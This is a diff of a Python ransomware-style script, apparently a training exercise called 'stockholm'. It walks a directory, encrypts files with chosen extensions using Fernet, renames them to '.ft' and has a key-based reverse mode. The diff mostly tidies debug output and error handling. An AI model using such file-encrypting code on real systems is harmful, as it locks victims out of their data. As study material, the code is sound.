@@ -1,8 +1,5 @@
 #!/usr/bin/env python3
 
-from tarfile import ReadError
-from traceback import print_tb
-from wsgiref.validate import WriteWrapper
 from cryptography.fernet import Fernet
 import os, pathlib, sys
 vers = "1.0.0"
@@ -51,29 +48,24 @@ def reverse():
     if (not laughfiles):
         printcolor("\n\nDecryption has failed. No encrypted files were found\n", "yellow", silent)
         exit()
-    # print(*laughfiles, sep = "\n")
     decrypted_files = []
 
     for file in laughfiles:
         try:
-            #print("The suffix of " + str(file) + " is " + pathlib.Path(os.path.join(file)).suffix)
             with open(file, "rb") as thefile:
                 contents_encrypted = thefile.read()
             if (not contents_encrypted):
                 printcolor(file + " is empty. Skipping to next file", "red", silent)
                 continue
-            print(file + " contents encrypted = " + str(contents_encrypted))
             contents = Fernet(sys.argv[2]).decrypt(contents_encrypted)
-            print(file + " real contents = " + str(contents))
             if (pathlib.Path(os.path.join(file)).suffix == ".ft"):
                 with open(file, "wb") as thefile:
                     thefile.write(contents)
                 decrypted_files.append(file)
                 printcolor(file + " has been decrypted", "yellow", silent)
                 os.rename(file, str(file).replace(".ft", ""))
-        except Exception as e:
-            printcolor(file + " does not have read or write permissions: ", "red", silent)
-            print(e)
+        except:
+            printcolor(file + " couldnt be decrypted", "red", silent)
     if (not decrypted_files):
         printcolor("\n\nDecryption has failed. No files were encrypted\n", "red", silent)
         exit()
@@ -116,7 +108,7 @@ elif (len(sys.argv) > 2):
     if (not (sys.argv[1] == "-reverse" or sys.argv[1] == "-r")):
         printcolor("\nThe option " + sys.argv[1] + " is not available. See -h for help\n", "yellow", silent)
         exit()
-    if (not os.path.exists("/home/xubuntu/Documents/stockholm/.not_the_key.key")):
+    if (not os.path.isfile(".not_the_key.key")):
         printcolor("\nYou didnt create any key yet. See -h for help\n", "yellow", silent)
         exit()
     keyfile = open(".not_the_key.key")
@@ -167,7 +159,9 @@ for path, dirs, files in os.walk(pathi):
         if pathlib.Path(os.path.join(path, name)).suffix in exts:
             cryfiles.append(os.path.join(path, name))
 
-
+if (not cryfiles):
+    printcolor("\n\nNo files to encrypt were detected\n", "red", silent)
+    exit()
 key = Fernet.generate_key()
 
 
@@ -189,12 +183,9 @@ for file in cryfiles:
                 thefile.write(contents_encrypted)
             encrypted_files.append(file)
             printcolor(file + " has been encrypted", "yellow", silent)
-            prevfile = file
             os.rename(file, file + ".ft")
-            print("Prevfile was: " + prevfile)
-            print("File is now: " + file)
-    except Exception as e:
-        printcolor(str(e), "red", silent)
+    except:
+        printcolor(file + " couldnt be encrypted", "red", silent)
 if (not encrypted_files):
     printcolor("\n\nEncryption has failed. No files were encrypted\n", "red", silent)
     exit()
